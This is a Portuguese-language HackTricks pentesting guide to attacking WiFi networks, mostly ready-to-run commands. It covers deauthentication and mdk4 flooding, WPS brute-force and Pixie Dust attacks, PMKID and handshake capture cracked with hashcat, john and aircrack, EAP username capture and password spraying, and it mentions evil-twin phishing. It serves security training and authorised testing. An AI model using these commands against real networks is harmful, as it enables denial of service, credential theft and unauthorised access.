# Pentesting Wifi

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Insights de Hacking**\
Engaje-se com conte√∫do que mergulha na emo√ß√£o e nos desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os novos programas de recompensas por bugs que est√£o sendo lan√ßados e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## Wifi comandos b√°sicos
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Ferramentas

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Execute airgeddon com docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Ele pode realizar ataques Evil Twin, KARMA e Known Beacons e, em seguida, usar um modelo de phishing para conseguir obter a senha real da rede ou capturar credenciais de redes sociais.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta ferramenta automatiza ataques **WPS/WEP/WPA-PSK**. Ela ir√° automaticamente:

* Definir a interface em modo monitor
* Escanear redes poss√≠veis - E permitir que voc√™ selecione a(s) v√≠tima(s)
* Se WEP - Lan√ßar ataques WEP
* Se WPA-PSK
* Se WPS: ataque Pixie dust e o ataque de for√ßa bruta (tenha cuidado, o ataque de for√ßa bruta pode demorar muito). Observe que n√£o tenta PINs nulos ou PINs gerados por banco de dados.
* Tentar capturar o PMKID do AP para quebr√°-lo
* Tentar desautenticar clientes do AP para capturar um handshake
* Se PMKID ou Handshake, tentar for√ßa bruta usando as 5000 senhas mais comuns.

## Resumo dos Ataques

* **DoS**
* Desautentica√ß√£o/desassocia√ß√£o -- Desconectar todos (ou um ESSID/Cliente espec√≠fico)
* APs falsos aleat√≥rios -- Ocultar redes, poss√≠vel travamento de scanners
* Sobrecarga do AP -- Tentar derrubar o AP (geralmente n√£o muito √∫til)
* WIDS -- Brincar com o IDS
* TKIP, EAPOL -- Alguns ataques espec√≠ficos para DoS em alguns APs
* **Quebra**
* Quebrar **WEP** (v√°rias ferramentas e m√©todos)
* **WPA-PSK**
* **WPS** pin "For√ßa Bruta"
* **WPA PMKID** for√ßa bruta
* \[DoS +] **Captura de handshake WPA** + Quebra
* **WPA-MGT**
* **Captura de Nome de Usu√°rio**
* **For√ßa Bruta** Credenciais
* **Evil Twin** (com ou sem DoS)
* **Open** Evil Twin \[+ DoS] -- √ötil para capturar credenciais de portal cativo e/ou realizar ataques LAN
* **WPA-PSK** Evil Twin -- √ötil para ataques de rede se voc√™ souber a senha
* **WPA-MGT** -- √ötil para capturar credenciais de empresa
* **KARMA, MANA**, **Loud MANA**, **Beacon conhecido**
* **+ Open** -- √ötil para capturar credenciais de portal cativo e/ou realizar ataques LAN
* **+ WPA** -- √ötil para capturar handshakes WPA

## DOS

### Pacotes de Desautentica√ß√£o

**Descri√ß√£o de** [**aqui**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Ataques de **desautentica√ß√£o**, um m√©todo prevalente em hacking Wi-Fi, envolvem forjar quadros de "gerenciamento" para **desconectar for√ßosamente dispositivos de uma rede**. Esses pacotes n√£o criptografados enganam os clientes, fazendo-os acreditar que s√£o da rede leg√≠tima, permitindo que os atacantes coletem handshakes WPA para fins de quebra ou para interromper persistentemente as conex√µes de rede. Essa t√°tica, alarmante em sua simplicidade, √© amplamente utilizada e tem implica√ß√µes significativas para a seguran√ßa da rede.

**Desautentica√ß√£o usando Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 significa desautentica√ß√£o
* 1 √© o n√∫mero de desautentica√ß√µes a enviar (voc√™ pode enviar v√°rias se desejar); 0 significa envi√°-las continuamente
* \-a 00:14:6C:7E:40:80 √© o endere√ßo MAC do ponto de acesso
* \-c 00:0F:B5:34:30:30 √© o endere√ßo MAC do cliente a ser desautenticado; se isso for omitido, ent√£o a desautentica√ß√£o em broadcast √© enviada (nem sempre funciona)
* ath0 √© o nome da interface

### Pacotes de Desassocia√ß√£o

**Pacotes de desassocia√ß√£o**, semelhantes aos pacotes de desautentica√ß√£o, s√£o um tipo de quadro de gerenciamento usado em redes Wi-Fi. Esses pacotes servem para romper a conex√£o entre um dispositivo (como um laptop ou smartphone) e um ponto de acesso (AP). A principal distin√ß√£o entre desassocia√ß√£o e desautentica√ß√£o reside em seus cen√°rios de uso. Enquanto um AP emite **pacotes de desautentica√ß√£o para remover explicitamente dispositivos indesejados da rede, pacotes de desassocia√ß√£o s√£o tipicamente enviados quando o AP est√° passando por um desligamento**, reinicializa√ß√£o ou reloca√ß√£o, necessitando assim a desconex√£o de todos os n√≥s conectados.

**Este ataque pode ser realizado pelo mdk4(modo "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Mais ataques DOS pelo mdk4**

**Em** [**aqui**](https://en.kali.tools/?p=864)**.**

**MODO DE ATAQUE b: Inunda√ß√£o de Beacon**

Envia quadros de beacon para mostrar APs falsos aos clientes. Isso pode, √†s vezes, travar scanners de rede e at√© mesmo drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODO DE ATAQUE a: Nega√ß√£o de Servi√ßo de Autentica√ß√£o**

Enviar quadros de autentica√ß√£o para todos os Pontos de Acesso (APs) acess√≠veis dentro do alcance pode sobrecarregar esses APs, especialmente quando numerosos clientes est√£o envolvidos. Esse tr√°fego intenso pode levar √† instabilidade do sistema, fazendo com que alguns APs congelem ou at√© mesmo reiniciem.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODO DE ATAQUE p: Probing de SSID e Bruteforcing**

Probing de Pontos de Acesso (APs) verifica se um SSID est√° devidamente revelado e confirma o alcance do AP. Esta t√©cnica, combinada com **bruteforcing de SSIDs ocultos** com ou sem uma lista de palavras, ajuda a identificar e acessar redes ocultas.

**MODO DE ATAQUE m: Explora√ß√£o de Contramedidas Michael**

Enviar pacotes aleat√≥rios ou duplicados para diferentes filas de QoS pode acionar as Contramedidas Michael em **APs TKIP**, levando a uma interrup√ß√£o do AP por um minuto. Este m√©todo √© uma t√°tica eficiente de **DoS** (Nega√ß√£o de Servi√ßo).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODO DE ATAQUE e: Inje√ß√£o de Pacotes EAPOL Start e Logoff**

Inundar um AP com **frames EAPOL Start** cria **sess√µes falsas**, sobrecarregando o AP e bloqueando clientes leg√≠timos. Alternativamente, injetar **mensagens EAPOL Logoff falsas** desconecta for√ßadamente os clientes, ambos os m√©todos interrompem efetivamente o servi√ßo de rede.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODO DE ATAQUE s: Ataques para redes mesh IEEE 802.11s**

V√°rios ataques √† gest√£o de links e roteamento em redes mesh.

**MODO DE ATAQUE w: Confus√£o WIDS**

Conectar clientes a m√∫ltiplos n√≥s WDS ou APs falsos pode manipular Sistemas de Detec√ß√£o e Preven√ß√£o de Intrus√µes, criando confus√£o e potencial abuso do sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODO DE ATAQUE f: Fuzzador de Pacotes**

Um fuzzador de pacotes com diversas fontes de pacotes e um conjunto abrangente de modificadores para manipula√ß√£o de pacotes.

### **Airggedon**

_**Airgeddon**_ oferece a maioria dos ataques propostos nos coment√°rios anteriores:

![](<../../.gitbook/assets/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) simplifica o processo de conectar dispositivos a um roteador, aumentando a velocidade e a facilidade de configura√ß√£o para redes criptografadas com **WPA** ou **WPA2** Pessoal. √â ineficaz para a seguran√ßa WEP facilmente comprometida. O WPS utiliza um PIN de 8 d√≠gitos, validado em duas partes, tornando-o suscet√≠vel a ataques de for√ßa bruta devido ao seu n√∫mero limitado de combina√ß√µes (11.000 possibilidades).

### WPS Bruteforce

Existem 2 ferramentas principais para realizar essa a√ß√£o: Reaver e Bully.

* **Reaver** foi projetado para ser um ataque robusto e pr√°tico contra o WPS, e foi testado contra uma ampla variedade de pontos de acesso e implementa√ß√µes de WPS.
* **Bully** √© uma **nova implementa√ß√£o** do ataque de for√ßa bruta WPS, escrita em C. Tem v√°rias vantagens sobre o c√≥digo original do reaver: menos depend√™ncias, melhor desempenho de mem√≥ria e CPU, tratamento correto de endianness e um conjunto de op√ß√µes mais robusto.

O ataque explora a **vulnerabilidade do PIN WPS**, particularmente sua exposi√ß√£o dos primeiros quatro d√≠gitos e o papel do √∫ltimo d√≠gito como uma soma de verifica√ß√£o, facilitando o ataque de for√ßa bruta. No entanto, defesas contra ataques de for√ßa bruta, como **bloquear endere√ßos MAC** de atacantes agressivos, exigem **rota√ß√£o de endere√ßos MAC** para continuar o ataque.

Ap√≥s obter o PIN WPS com ferramentas como Bully ou Reaver, o atacante pode deduzir o PSK WPA/WPA2, garantindo **acesso persistente √† rede**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**For√ßa Bruta Inteligente**

Esta abordagem refinada visa os PINs WPS usando vulnerabilidades conhecidas:

1. **PINs pr√©-descobertos**: Utilize um banco de dados de PINs conhecidos vinculados a fabricantes espec√≠ficos que usam PINs WPS uniformes. Este banco de dados correlaciona os tr√™s primeiros octetos dos endere√ßos MAC com os PINs prov√°veis para esses fabricantes.
2. **Algoritmos de Gera√ß√£o de PIN**: Aproveite algoritmos como ComputePIN e EasyBox, que calculam PINs WPS com base no endere√ßo MAC do AP. O algoritmo Arcadyan tamb√©m requer um ID de dispositivo, adicionando uma camada ao processo de gera√ß√£o de PIN.

### Ataque WPS Pixie Dust

**Dominique Bongard** descobriu uma falha em alguns Pontos de Acesso (APs) relacionada √† cria√ß√£o de c√≥digos secretos, conhecidos como **nonces** (**E-S1** e **E-S2**). Se esses nonces puderem ser descobertos, quebrar o PIN WPS do AP se torna f√°cil. O AP revela o PIN dentro de um c√≥digo especial (hash) para provar que √© leg√≠timo e n√£o um AP falso (rogue). Esses nonces s√£o essencialmente as "chaves" para desbloquear o "cofre" que cont√©m o PIN WPS. Mais sobre isso pode ser encontrado [aqui](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

Em termos simples, o problema √© que alguns APs n√£o usaram chaves suficientemente aleat√≥rias para criptografar o PIN durante o processo de conex√£o. Isso torna o PIN vulner√°vel a ser adivinhado de fora da rede (ataque de for√ßa bruta offline).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Se voc√™ n√£o quiser mudar o dispositivo para o modo monitor, ou se `reaver` e `bully` tiverem algum problema, voc√™ pode tentar [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Esta ferramenta pode realizar o ataque Pixie Dust sem precisar mudar para o modo monitor.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Ataque de Null Pin

Alguns sistemas mal projetados permitem at√© um **Null PIN** (um PIN vazio ou inexistente) conceder acesso, o que √© bastante incomum. A ferramenta **Reaver** √© capaz de testar essa vulnerabilidade, ao contr√°rio do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos os ataques WPS propostos podem ser facilmente realizados usando _**airgeddon.**_

![](<../../.gitbook/assets/image (219).png>)

* 5 e 6 permitem que voc√™ tente **seu PIN personalizado** (se voc√™ tiver algum)
* 7 e 8 realizam o **ataque Pixie Dust**
* 13 permite que voc√™ teste o **PIN NULO**
* 11 e 12 **recolher√£o os PINs relacionados ao AP selecionado de bancos de dados dispon√≠veis** e **gerar√£o** poss√≠veis **PINs** usando: ComputePIN, EasyBox e opcionalmente Arcadyan (recomendado, por que n√£o?)
* 9 e 10 testar√£o **todos os PINs poss√≠veis**

## **WEP**

T√£o quebrado e n√£o utilizado atualmente. Apenas saiba que _**airgeddon**_ tem uma op√ß√£o WEP chamada "All-in-One" para atacar esse tipo de prote√ß√£o. Mais ferramentas oferecem op√ß√µes semelhantes.

![](<../../.gitbook/assets/image (432).png>)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Insights de Hacking**\
Engaje-se com conte√∫do que mergulha na emo√ß√£o e nos desafios do hacking

**Not√≠cias de Hack em Tempo Real**\
Mantenha-se atualizado com o mundo do hacking em ritmo acelerado atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os novos programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

***

## WPA/WPA2 PSK

### PMKID

Em 2018, **hashcat** [revelou](https://hashcat.net/forum/thread-7717.html) um novo m√©todo de ataque, √∫nico porque precisa apenas de **um √∫nico pacote** e n√£o requer que nenhum cliente esteja conectado ao AP alvo‚Äîapenas intera√ß√£o entre o atacante e o AP.

Muitos roteadores modernos adicionam um **campo opcional** ao **primeiro quadro EAPOL** durante a associa√ß√£o, conhecido como `Robust Security Network`. Isso inclui o `PMKID`.

Como explica a postagem original, o **PMKID** √© criado usando dados conhecidos:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dado que o "Nome PMK" √© constante, sabemos o BSSID do AP e da esta√ß√£o, e o `PMK` √© id√™ntico ao de um handshake completo de 4 vias, **hashcat** pode usar essas informa√ß√µes para quebrar o PSK e recuperar a frase secreta!

Para **coletar** essas informa√ß√µes e **for√ßar** localmente a senha, voc√™ pode fazer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Os **PMKIDs capturados** ser√£o exibidos no **console** e tamb√©m **salvos** dentro de \_ **/tmp/attack.pcap**\_\
Agora, converta a captura para o formato **hashcat/john** e quebre-a:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Por favor, note que o formato de um hash correto cont√©m **4 partes**, como: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Se o seu **somente** cont√©m **3 partes**, ent√£o, √© **inv√°lido** (a captura do PMKID n√£o era v√°lida).

Note que `hcxdumptool` **tamb√©m captura handshakes** (algo como isso aparecer√°: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Voc√™ pode **transformar** os **handshakes** para o formato **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Eu notei que alguns handshakes capturados com esta ferramenta n√£o puderam ser quebrados mesmo sabendo a senha correta. Eu recomendaria capturar handshakes tamb√©m de forma tradicional, se poss√≠vel, ou capturar v√°rios deles usando esta ferramenta._

### Captura de handshake

Um ataque a redes **WPA/WPA2** pode ser executado capturando um **handshake** e tentando **crackear** a senha **offline**. Este processo envolve monitorar a comunica√ß√£o de uma rede espec√≠fica e **BSSID** em um **canal** particular. Aqui est√° um guia simplificado:

1. Identifique o **BSSID**, **canal** e um **cliente conectado** da rede alvo.
2. Use `airodump-ng` para monitorar o tr√°fego da rede no canal e BSSID especificados, esperando capturar um handshake. O comando ficar√° assim:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Para aumentar a chance de capturar um handshake, desconecte momentaneamente o cliente da rede para for√ßar uma reautentica√ß√£o. Isso pode ser feito usando o comando `aireplay-ng`, que envia pacotes de desautentica√ß√£o para o cliente:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note que, como o cliente foi desautenticado, ele pode tentar se conectar a um AP diferente ou, em outros casos, a uma rede diferente._

Uma vez que no `airodump-ng` aparece alguma informa√ß√£o de handshake, isso significa que o handshake foi capturado e voc√™ pode parar de escutar:

![](<../../.gitbook/assets/image (172) (1).png>)

Uma vez que o handshake √© capturado, voc√™ pode **crack** com `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verifique se o handshake est√° no arquivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Se esta ferramenta encontrar um handshake incompleto de um ESSID antes do completo, ela n√£o detectar√° o v√°lido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Em **configura√ß√µes de WiFi empresarial, voc√™ encontrar√° v√°rios m√©todos de autentica√ß√£o**, cada um oferecendo diferentes n√≠veis de seguran√ßa e recursos de gerenciamento. Quando voc√™ usa ferramentas como `airodump-ng` para inspecionar o tr√°fego da rede, pode notar identificadores para esses tipos de autentica√ß√£o. Alguns m√©todos comuns incluem:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Este m√©todo suporta tokens de hardware e senhas de uso √∫nico dentro do EAP-PEAP. Ao contr√°rio do MSCHAPv2, ele n√£o usa um desafio de par e envia senhas em texto claro para o ponto de acesso, apresentando um risco para ataques de downgrade.
2. **EAP-MD5 (Message Digest 5)**:
* Envolve o envio do hash MD5 da senha do cliente. **N√£o √© recomendado** devido √† vulnerabilidade a ataques de dicion√°rio, falta de autentica√ß√£o do servidor e incapacidade de gerar chaves WEP espec√≠ficas para a sess√£o.
3. **EAP-TLS (Transport Layer Security)**:
* Utiliza certificados tanto do lado do cliente quanto do lado do servidor para autentica√ß√£o e pode gerar dinamicamente chaves WEP baseadas em usu√°rio e sess√£o para proteger as comunica√ß√µes.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
* Fornece autentica√ß√£o m√∫tua atrav√©s de um t√∫nel criptografado, juntamente com um m√©todo para derivar chaves WEP din√¢micas, por usu√°rio e por sess√£o. Requer apenas certificados do lado do servidor, com os clientes usando credenciais.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* Funciona de maneira semelhante ao EAP, criando um t√∫nel TLS para comunica√ß√£o protegida. Permite o uso de protocolos de autentica√ß√£o mais fracos em cima do EAP devido √† prote√ß√£o oferecida pelo t√∫nel.
* **PEAP-MSCHAPv2**: Frequentemente referido como PEAP, combina o vulner√°vel mecanismo de desafio/resposta MSCHAPv2 com um t√∫nel TLS protetor.
* **PEAP-EAP-TLS (ou PEAP-TLS)**: Semelhante ao EAP-TLS, mas inicia um t√∫nel TLS antes de trocar certificados, oferecendo uma camada adicional de seguran√ßa.

Voc√™ pode encontrar mais informa√ß√µes sobre esses m√©todos de autentica√ß√£o [aqui](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) e [aqui](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Captura de Nome de Usu√°rio

Lendo [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27), parece que se voc√™ estiver usando **EAP**, as **mensagens "Identidade"** devem ser **suportadas**, e o **nome de usu√°rio** ser√° enviado em **claro** nas mensagens de **"Resposta de Identidade"**.

Mesmo usando um dos m√©todos de autentica√ß√£o mais seguros: **PEAP-EAP-TLS**, √© poss√≠vel **capturar o nome de usu√°rio enviado no protocolo EAP**. Para fazer isso, **capture uma comunica√ß√£o de autentica√ß√£o** (inicie `airodump-ng` dentro de um canal e `wireshark` na mesma interface) e filtre os pacotes por `eapol`.\
Dentro do pacote "**Resposta, Identidade**", o **nome de usu√°rio** do cliente aparecer√°.

![](<../../.gitbook/assets/image (850).png>)

### Identidades An√¥nimas

A oculta√ß√£o de identidade √© suportada tanto pelo EAP-PEAP quanto pelo EAP-TTLS. No contexto de uma rede WiFi, uma solicita√ß√£o de EAP-Identidade √© tipicamente iniciada pelo ponto de acesso (AP) durante o processo de associa√ß√£o. Para garantir a prote√ß√£o da anonimidade do usu√°rio, a resposta do cliente EAP no dispositivo do usu√°rio cont√©m apenas as informa√ß√µes essenciais necess√°rias para que o servidor RADIUS inicial processe a solicita√ß√£o. Este conceito √© ilustrado atrav√©s dos seguintes cen√°rios:

* EAP-Identidade = an√¥nimo
* Neste cen√°rio, todos os usu√°rios utilizam o pseud√¥nimo "an√¥nimo" como seu identificador de usu√°rio. O servidor RADIUS inicial funciona como um servidor EAP-PEAP ou EAP-TTLS, respons√°vel por gerenciar o lado do servidor do protocolo PEAP ou TTLS. O m√©todo de autentica√ß√£o interno (protegido) √© ent√£o tratado localmente ou delegado a um servidor RADIUS remoto (dom√©stico).
* EAP-Identidade = an√¥nimo@realm\_x
* Nesta situa√ß√£o, usu√°rios de diferentes dom√≠nios ocultam suas identidades enquanto indicam seus respectivos dom√≠nios. Isso permite que o servidor RADIUS inicial fa√ßa proxy das solicita√ß√µes EAP-PEAP ou EAP-TTLS para servidores RADIUS em seus dom√≠nios dom√©sticos, que atuam como o servidor PEAP ou TTLS. O servidor RADIUS inicial opera apenas como um n√≥ de retransmiss√£o RADIUS.
* Alternativamente, o servidor RADIUS inicial pode funcionar como o servidor EAP-PEAP ou EAP-TTLS e tratar o m√©todo de autentica√ß√£o protegido ou encaminh√°-lo para outro servidor. Esta op√ß√£o facilita a configura√ß√£o de pol√≠ticas distintas para v√°rios dom√≠nios.

No EAP-PEAP, uma vez que o t√∫nel TLS √© estabelecido entre o servidor PEAP e o cliente PEAP, o servidor PEAP inicia uma solicita√ß√£o de EAP-Identidade e a transmite atrav√©s do t√∫nel TLS. O cliente responde a esta segunda solicita√ß√£o de EAP-Identidade enviando uma resposta de EAP-Identidade contendo a verdadeira identidade do usu√°rio atrav√©s do t√∫nel criptografado. Esta abordagem efetivamente impede a revela√ß√£o da verdadeira identidade do usu√°rio para qualquer um que esteja espionando o tr√°fego 802.11.

O EAP-TTLS segue um procedimento ligeiramente diferente. Com o EAP-TTLS, o cliente normalmente se autentica usando PAP ou CHAP, protegido pelo t√∫nel TLS. Neste caso, o cliente inclui um atributo User-Name e um atributo Password ou CHAP-Password na mensagem TLS inicial enviada ap√≥s o estabelecimento do t√∫nel.

Independentemente do protocolo escolhido, o servidor PEAP/TTLS obt√©m conhecimento da verdadeira identidade do usu√°rio ap√≥s o t√∫nel TLS ter sido estabelecido. A verdadeira identidade pode ser representada como user@realm ou simplesmente user. Se o servidor PEAP/TTLS tamb√©m for respons√°vel por autenticar o usu√°rio, ele agora possui a identidade do usu√°rio e prossegue com o m√©todo de autentica√ß√£o protegido pelo t√∫nel TLS. Alternativamente, o servidor PEAP/TTLS pode encaminhar uma nova solicita√ß√£o RADIUS para o servidor RADIUS dom√©stico do usu√°rio. Esta nova solicita√ß√£o RADIUS omite a camada do protocolo PEAP ou TTLS. Nos casos em que o m√©todo de autentica√ß√£o protegido √© EAP, as mensagens EAP internas s√£o transmitidas para o servidor RADIUS dom√©stico sem a embalagem EAP-PEAP ou EAP-TTLS. O atributo User-Name da mensagem RADIUS de sa√≠da cont√©m a verdadeira identidade do usu√°rio, substituindo o User-Name an√¥nimo da solicita√ß√£o RADIUS de entrada. Quando o m√©todo de autentica√ß√£o protegido √© PAP ou CHAP (suportado apenas pelo TTLS), o User-Name e outros atributos de autentica√ß√£o extra√≠dos da carga √∫til TLS s√£o substitu√≠dos na mensagem RADIUS de sa√≠da, deslocando os atributos User-Name an√¥nimo e TTLS EAP-Message encontrados na solicita√ß√£o RADIUS de entrada.

Para mais informa√ß√µes, consulte [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

Se espera-se que o cliente use um **nome de usu√°rio e senha** (note que **EAP-TLS n√£o ser√° v√°lido** neste caso), ent√£o voc√™ pode tentar obter uma **lista** de **nomes de usu√°rio** (veja a pr√≥xima parte) e **senhas** e tentar **brutefor√ßar** o acesso usando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Voc√™ tamb√©m pode realizar este ataque usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria de Ataques ao Cliente

### Sele√ß√£o de Rede e Roaming

* O protocolo 802.11 define como uma esta√ß√£o se junta a um Conjunto de Servi√ßo Estendido (ESS), mas n√£o especifica os crit√©rios para selecionar um ESS ou um ponto de acesso (AP) dentro dele.
* As esta√ß√µes podem fazer roaming entre APs que compartilham o mesmo ESSID, mantendo a conectividade em um edif√≠cio ou √°rea.
* O protocolo exige autentica√ß√£o da esta√ß√£o ao ESS, mas n√£o exige autentica√ß√£o do AP √† esta√ß√£o.

### Listas de Redes Preferidas (PNLs)

